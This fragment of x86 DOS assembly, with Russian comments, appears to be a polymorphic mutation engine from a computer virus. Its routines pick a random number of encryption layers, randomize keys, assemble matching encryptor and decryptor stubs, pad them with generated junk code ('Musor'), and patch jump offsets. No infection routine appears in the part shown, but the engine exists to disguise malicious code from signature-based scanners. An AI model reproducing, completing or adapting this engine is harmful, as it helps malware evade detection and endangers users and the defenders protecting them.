MaxCode equ 60
PolyProc:
      mov ah,MaxCode
      call RND_Tabelle
      mov al,0
      xchg ah,al
      xchg cx,ax
      inc cx
@PP1:
      push cx
      call RandomizeKey
      mov ah,17
      call RND_Tabelle
      mov al,0
      xchg ah,al
      shl ax,1
      call CryptorCreate
      call DecryptorCreate
      pop cx
      dec cx
      cmp cx,0
      jne @PP1
      ret
;---
CryptorCreate:
      lea di,[bp+TabelleOfsCrypt]
      add di,ax
      mov si,word ptr ds:[di]
      add si,bp
      lea di,[bp+TabelleLengthCode]
      add di,ax
      mov cx,word ptr ds:[di]
      mov di,SI_CUR
      rep movsb
      mov SI_CUR,di
      ret
;---
DecryptorCreate:
      lea di,[bp+TabelleOfsDeCrypt]
      add di,ax
      mov si,word ptr ds:[di]
      add si,bp
      lea di,[bp+TabelleLengthDecode]
      add di,ax
      mov cx,word ptr ds:[di]
      mov di,DI_CUR
      sub di,cx
      push cx
      rep movsb
      pop cx
      sub di,cx
      call CreateMusor
      mov DI_CUR,di
      ret
;---
CreateMusor:
      push di
      lea di,Buff
      call Musor
      mov cx,di
      lea si,Buff
      sub cx,si
      pop di
      sub di,cx
      push cx
      rep movsb
      pop cx
      sub di,cx
      ret
;--- Калькуляция перехода
;Input:  si - адрес метки для перехода
;        di - адрес команды перехода
;        bx - адрес начала буфера
;Output: none
CalcJump:
         push ax bx cx dx
         mov ax,di
         mov dx,si
         sub ax,bx
         sub dx,bx
         cmp ax,dx
         jl JumpDown
JumpUp:
         mov cx,0ffffh
         sub ax,dx
         sub cx,ax
         sub cx,2
         xchg dx,cx
         jmp FormJump
JumpDown:
         add ax,3
         sub dx,ax
FormJump:
         mov word ptr ds:[di+1],dx
         pop dx cx bx ax
         ret
;---
Randomizekey:
      call _Calc_Rnd16
      lea di,@@ctb
      mov word ptr ds:[di+1],bx
      call _Calc_Rnd16
      lea di,@@ctc
      mov word ptr ds:[di+1],bx
      lea di,@@ctd
      mov word ptr ds:[di+1],bx
      mov ah,0ffh
      call RND_Tabelle
      lea di,@@ct10
      mov byte ptr ds:[di+2],ah
      lea di,@@ct11
      mov byte ptr ds:[di+2],ah
;*
      call _Calc_Rnd16
      lea di,@@ct12
      mov word ptr ds:[di+2],bx
      ret
